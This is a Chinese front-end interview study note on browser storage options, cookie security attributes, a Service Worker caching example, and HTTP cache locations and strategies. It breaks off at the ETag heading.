### <font style="color:rgb(44, 62, 80);">储存</font>
<font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);">涉及面试题：有几种方式可以实现存储功能，分别有什么优缺点？什么是</font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">Service Worker</font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);">？</font>

**<font style="color:rgb(44, 62, 80);">cookie，localStorage，sessionStorage，indexDB</font>**

| <font style="color:rgb(44, 62, 80);">特性</font> | <font style="color:rgb(44, 62, 80);">cookie</font> | <font style="color:rgb(44, 62, 80);">localStorage</font> | <font style="color:rgb(44, 62, 80);">sessionStorage</font> | <font style="color:rgb(44, 62, 80);">indexDB</font> |
| --- | --- | --- | --- | --- |
| <font style="color:rgb(44, 62, 80);">数据生命周期</font> | <font style="color:rgb(44, 62, 80);">一般由服务器生成，可以设置过期时间</font> | <font style="color:rgb(44, 62, 80);">除非被清理，否则一直存在</font> | <font style="color:rgb(44, 62, 80);">页面关闭就清理</font> | <font style="color:rgb(44, 62, 80);">除非被清理，否则一直存在</font> |
| <font style="color:rgb(44, 62, 80);">数据存储大小</font> | <font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">4KB</font> | <font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">5M</font> | <font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">5M</font> | <font style="color:rgb(44, 62, 80);">无限</font> |
| <font style="color:rgb(44, 62, 80);">与服务端通信</font> | <font style="color:rgb(44, 62, 80);">每次都会携带在</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">header</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(44, 62, 80);">中，对于请求性能影响</font> | <font style="color:rgb(44, 62, 80);">不参与</font> | <font style="color:rgb(44, 62, 80);">不参与</font> | <font style="color:rgb(44, 62, 80);">不参与</font> |


<font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);">从上表可以看到，</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">cookie</font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);"> </font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);">已经不建议用于存储。如果没有大量数据存储需求的话，可以使用</font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">localStorage</font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);"> </font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);">和</font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">sessionStorage</font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);"> </font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);">。对于不怎么改变的数据尽量使用</font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">localStorage</font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);"> </font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);">存储，否则可以用</font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">sessionStorage</font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);">存储</font>

**<font style="color:rgb(44, 62, 80);">对于 cookie 来说，我们还需要注意安全性。</font>**

| <font style="color:rgb(44, 62, 80);">属性</font> | <font style="color:rgb(44, 62, 80);">作用</font> |
| --- | --- |
| <font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">value</font> | <font style="color:rgb(44, 62, 80);">如果用于保存用户登录态，应该将该值加密，不能使用明文的用户标识</font> |
| <font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">http-only</font> | <font style="color:rgb(44, 62, 80);">不能通过</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">JS</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(44, 62, 80);">访问</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">Cookie</font><font style="color:rgb(44, 62, 80);">，减少</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">XSS</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(44, 62, 80);">攻击</font> |
| <font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">secure</font> | <font style="color:rgb(44, 62, 80);">只能在协议为</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">HTTPS</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(44, 62, 80);">的请求中携带</font> |
| <font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">same-site</font> | <font style="color:rgb(44, 62, 80);">规定浏览器不能在跨域请求中携带</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">Cookie</font><font style="color:rgb(44, 62, 80);">，减少</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">CSRF</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(44, 62, 80);">攻击</font> |


**<font style="color:rgb(44, 62, 80);">Service Worker</font>**

+ <font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">Service Worker</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(44, 62, 80);">是运行在浏览器背后的独立线程，一般可以用来实现缓存功能。使用</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">Service Worker</font><font style="color:rgb(44, 62, 80);">的话，传输协议必须为</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">HTTPS</font><font style="color:rgb(44, 62, 80);">。因为</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">Service Worker</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(44, 62, 80);">中涉及到请求拦截，所以必须使用</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">HTTPS</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(44, 62, 80);">协议来保障安全</font>
+ <font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">Service Worker</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(44, 62, 80);">实现缓存功能一般分为三个步骤：首先需要先注册</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">Service Worker</font><font style="color:rgb(44, 62, 80);">，然后监听到</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">install</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(44, 62, 80);">事件以后就可以缓存需要的文件，那么在下次用户访问的时候就可以通过拦截请求的方式查询是否存在缓存，存在缓存的话就可以直接读取缓存文件，否则就去请求数据。以下是这个步骤的实现：</font>

```javascript
// index.js
if (navigator.serviceWorker) {
  navigator.serviceWorker
    .register('sw.js')
    .then(function(registration) {
      console.log('service worker 注册成功')
    })
    .catch(function(err) {
      console.log('servcie worker 注册失败')
    })
}
// sw.js
// 监听 `install` 事件，回调中缓存所需文件
self.addEventListener('install', e => {
  e.waitUntil(
    caches.open('my-cache').then(function(cache) {
      return cache.addAll(['./index.html', './index.js'])
    })
  )
})

// 拦截所有请求事件
// 如果缓存中已经有请求的数据就直接用缓存，否则去请求数据
self.addEventListener('fetch', e => {
  e.respondWith(
    caches.match(e.request).then(function(response) {
      if (response) {
        return response
      }
      console.log('fetch source')
    })
  )
})
```

<font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);">打开页面，可以在开发者工具中的</font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">Application</font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);"> </font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);">看到</font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">Service Worker</font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);"> </font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);">已经启动了</font>

<font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);">在</font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">Cache</font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);"> </font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);">中也可以发现我们所需的文件已被缓存</font>

![](https://cdn.nlark.com/yuque/0/2024/png/207857/1718783560719-38adb9e5-6aeb-4011-8c95-930fc3da4710.png)

<font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);">当我们重新刷新页面可以发现我们缓存的数据是从</font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">Service Worker</font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);"> </font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);">中读取的</font>

### [](https://www.123fe.net/docs/base/high-frequency.html#%E6%B5%8F%E8%A7%88%E5%99%A8%E7%BC%93%E5%AD%98%E6%9C%BA%E5%88%B6)<font style="color:rgb(44, 62, 80);">浏览器缓存机制</font>
<font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);">注意：该知识点属于性能优化领域，并且整一章节都是一个面试题</font>

+ <font style="color:rgb(44, 62, 80);">缓存可以说是性能优化中简单高效的一种优化方式了，它可以显著减少网络传输所带来的损耗。</font>
+ <font style="color:rgb(44, 62, 80);">对于一个数据请求来说，可以分为发起网络请求、后端处理、浏览器响应三个步骤。浏览器缓存可以帮助我们在第一和第三步骤中优化性能。比如说直接使用缓存而不发起请求，或者发起了请求但后端存储的数据和前端一致，那么就没有必要再将数据回传回来，这样就减少了响应数据。</font>

<font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);">接下来的内容中我们将通过以下几个部分来探讨浏览器缓存机制：</font>

+ <font style="color:rgb(44, 62, 80);">缓存位置</font>
+ <font style="color:rgb(44, 62, 80);">缓存策略</font>
+ <font style="color:rgb(44, 62, 80);">实际场景应用缓存策略</font>

**<font style="color:rgb(44, 62, 80);">1. 缓存位置</font>**

<font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);">从缓存位置上来说分为四种，并且各自有优先级，当依次查找缓存且都没有命中的时候，才会去请求网络</font>

1. <font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">Service Worker</font>
2. <font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">Memory Cache</font>
3. <font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">Disk Cache</font>
4. <font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">Push Cache</font>
5. <font style="color:rgb(44, 62, 80);">网络请求</font>

**<font style="color:rgb(44, 62, 80);">1.1 Service Worker</font>**

+ <font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">service Worker</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(44, 62, 80);">的缓存与浏览器其他内建的缓存机制不同，它可以让我们自由控制缓存哪些文件、如何匹配缓存、如何读取缓存，并且缓存是持续性的。</font>
+ <font style="color:rgb(44, 62, 80);">当</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">Service Worker</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(44, 62, 80);">没有命中缓存的时候，我们需要去调用</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">fetch</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(44, 62, 80);">函数获取数据。也就是说，如果我们没有在</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">Service Worker</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(44, 62, 80);">命中缓存的话，会根据缓存查找优先级去查找数据。但是不管我们是从</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">Memory Cache</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(44, 62, 80);">中还是从网络请求中获取的数据，浏览器都会显示我们是从</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">Service Worker</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(44, 62, 80);">中获取的内容。</font>

**<font style="color:rgb(44, 62, 80);">1.2 Memory Cache</font>**

+ <font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">Memory Cache</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(44, 62, 80);">也就是内存中的缓存，读取内存中的数据肯定比磁盘快。但是内存缓存虽然读取高效，可是缓存持续性很短，会随着进程的释放而释放。 一旦我们关闭</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">Tab</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(44, 62, 80);">页面，内存中的缓存也就被释放了。</font>
+ <font style="color:rgb(44, 62, 80);">当我们访问过页面以后，再次刷新页面，可以发现很多数据都来自于内存缓存</font>

![](https://cdn.nlark.com/yuque/0/2024/png/207857/1718783562302-72681afc-5d43-41bd-847f-a18c9ca1f548.png)

<font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);">那么既然内存缓存这么高效，我们是不是能让数据都存放在内存中呢？</font>

+ <font style="color:rgb(44, 62, 80);">先说结论，这是不可能的。首先计算机中的内存一定比硬盘容量小得多，操作系统需要精打细算内存的使用，所以能让我们使用的内存必然不多。内存中其实可以存储大部分的文件，比如说</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">JS</font><font style="color:rgb(44, 62, 80);">、</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">HTML</font><font style="color:rgb(44, 62, 80);">、</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">CSS</font><font style="color:rgb(44, 62, 80);">、图片等等</font>
+ <font style="color:rgb(44, 62, 80);">当然，我通过一些实践和猜测也得出了一些结论：</font>
+ <font style="color:rgb(44, 62, 80);">对于大文件来说，大概率是不存储在内存中的，反之优先当前系统内存使用率高的话，文件优先存储进硬盘</font>

**<font style="color:rgb(44, 62, 80);">1.3 Disk Cache</font>**

+ <font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">Disk Cache</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(44, 62, 80);">也就是存储在硬盘中的缓存，读取速度慢点，但是什么都能存储到磁盘中，比之</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">Memory Cache</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(44, 62, 80);">胜在容量和存储时效性上。</font>
+ <font style="color:rgb(44, 62, 80);">在所有浏览器缓存中，</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">Disk Cache</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(44, 62, 80);">覆盖面基本是最大的。它会根据</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">HTTP Herder</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(44, 62, 80);">中的字段判断哪些资源需要缓存，哪些资源可以不请求直接使用，哪些资源已经过期需要重新请求。并且即使在跨站点的情况下，相同地址的资源一旦被硬盘缓存下来，就不会再次去请求数据</font>

**<font style="color:rgb(44, 62, 80);">1.4 Push Cache</font>**

+ <font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">Push Cache</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(44, 62, 80);">是</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">HTTP/2</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(44, 62, 80);">中的内容，当以上三种缓存都没有命中时，它才会被使用。并且缓存时间也很短暂，只在会话（</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">Session</font><font style="color:rgb(44, 62, 80);">）中存在，一旦会话结束就被释放。</font>
+ <font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">Push Cache</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(44, 62, 80);">在国内能够查到的资料很少，也是因为</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">HTTP/2</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(44, 62, 80);">在国内不够普及，但是</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">HTTP/2</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(44, 62, 80);">将会是日后的一个趋势</font>

<font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);">结论</font>

+ <font style="color:rgb(44, 62, 80);">所有的资源都能被推送，但是</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">Edge</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(44, 62, 80);">和</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">Safari</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(44, 62, 80);">浏览器兼容性不怎么好</font>
+ <font style="color:rgb(44, 62, 80);">可以推送</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">no-cache</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(44, 62, 80);">和</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">no-store</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(44, 62, 80);">的资源</font>
+ <font style="color:rgb(44, 62, 80);">一旦连接被关闭，</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">Push Cache</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(44, 62, 80);">就被释放</font>
+ <font style="color:rgb(44, 62, 80);">多个页面可以使用相同的</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">HTTP/2</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(44, 62, 80);">连接，也就是说能使用同样的缓存</font>
+ <font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">Push Cache</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(44, 62, 80);">中的缓存只能被使用一次</font>
+ <font style="color:rgb(44, 62, 80);">浏览器可以拒绝接受已经存在的资源推送</font>
+ <font style="color:rgb(44, 62, 80);">你可以给其他域名推送资源</font>

**<font style="color:rgb(44, 62, 80);">1.5 网络请求</font>**

+ <font style="color:rgb(44, 62, 80);">如果所有缓存都没有命中的话，那么只能发起请求来获取资源了。</font>
+ <font style="color:rgb(44, 62, 80);">那么为了性能上的考虑，大部分的接口都应该选择好缓存策略，接下来我们就来学习缓存策略这部分的内容</font>

**<font style="color:rgb(44, 62, 80);">2 缓存策略</font>**

<font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);">通常浏览器缓存策略分为两种：强缓存和协商缓存，并且缓存策略都是通过设置</font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">HTTP Header</font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);"> </font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);">来实现的</font>

**<font style="color:rgb(44, 62, 80);">2.1 强缓存</font>**

<font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);">强缓存可以通过设置两种</font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">HTTP Header</font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);"> </font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);">实现：</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">Expires</font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);"> </font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);">和</font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">Cache-Control</font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);"> </font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);">。强缓存表示在缓存期间不需要请求，</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">state code</font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);"> </font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);">为</font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">200</font>

**<font style="color:rgb(44, 62, 80);">Expires</font>**

```bash
Expires: Wed, 22 Oct 2018 08:41:00 GMT
```

<font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">Expires</font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);"> </font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);">是</font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">HTTP/1</font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);"> </font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);">的产物，表示资源会在</font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">Wed, 22 Oct 2018 08:41:00 GMT</font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);"> </font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);">后过期，需要再次请求。并且</font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">Expires</font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);"> </font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);">受限于本地时间，如果修改了本地时间，可能会造成缓存失效。</font>

**<font style="color:rgb(44, 62, 80);">Cache-control</font>**

```bash
Cache-control: max-age=30
```

+ <font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">Cache-Control</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(44, 62, 80);">出现于</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">HTTP/1.1</font><font style="color:rgb(44, 62, 80);">，优先级高于</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">Expires</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(44, 62, 80);">。该属性值表示资源会在</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">30</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(44, 62, 80);">秒后过期，需要再次请求。</font>
+ <font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">Cache-Control</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(44, 62, 80);">可以在请求头或者响应头中设置，并且可以组合使用多种指令</font>

![](https://cdn.nlark.com/yuque/0/2024/png/207857/1718783562303-dd2f195f-4a39-4597-9e53-d8840d3a84a9.png)

<font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);">从图中我们可以看到，我们可以将多个指令配合起来一起使用，达到多个目的。比如说我们希望资源能被缓存下来，并且是客户端和代理服务器都能缓存，还能设置缓存失效时间等</font>

**<font style="color:rgb(44, 62, 80);">一些常见指令的作用</font>**

![](https://cdn.nlark.com/yuque/0/2024/png/207857/1718783562306-3833dc9a-9602-41da-bd8f-573048b73d1f.png)

**<font style="color:rgb(44, 62, 80);">2.2 协商缓存</font>**

+ <font style="color:rgb(44, 62, 80);">如果缓存过期了，就需要发起请求验证资源是否有更新。协商缓存可以通过设置两种</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">HTTP Header</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(44, 62, 80);">实现：</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">Last-Modified</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(44, 62, 80);">和</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">ETag</font>
+ <font style="color:rgb(44, 62, 80);">当浏览器发起请求验证资源时，如果资源没有做改变，那么服务端就会返回</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">304</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(44, 62, 80);">状态码，并且更新浏览器缓存有效期。</font>

![](https://cdn.nlark.com/yuque/0/2024/png/207857/1718783562127-d6e3eda6-1868-4264-863d-5e1e2df0f377.png)

**<font style="color:rgb(44, 62, 80);">Last-Modified 和 If-Modified-Since</font>**

<font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">Last-Modified</font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);"> </font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);">表示本地文件最后修改日期，</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">If-Modified-Since</font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);"> </font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);">会将</font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">Last-Modified</font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);"> </font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);">的值发送给服务器，询问服务器在该日期后资源是否有更新，有更新的话就会将新的资源发送回来，否则返回</font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">304</font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);"> </font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);">状态码。</font>

<font style="color:rgb(44, 62, 80);">但是</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">Last-Modified</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(44, 62, 80);">存在一些弊端：</font>

+ <font style="color:rgb(44, 62, 80);">如果本地打开缓存文件，即使没有对文件进行修改，但还是会造成</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">Last-Modified</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(44, 62, 80);">被修改，服务端不能命中缓存导致发送相同的资源</font>
+ <font style="color:rgb(44, 62, 80);">因为</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">Last-Modified</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(44, 62, 80);">只能以秒计时，如果在不可感知的时间内修改完成文件，那么服务端会认为资源还是命中了，不会返回正确的资源 因为以上这些弊端，所以在</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">HTTP / 1.1</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(44, 62, 80);">出现了</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">ETag</font>

**<font style="color:rgb(44, 62, 80);">ETag 和 If-None-Match</font>**

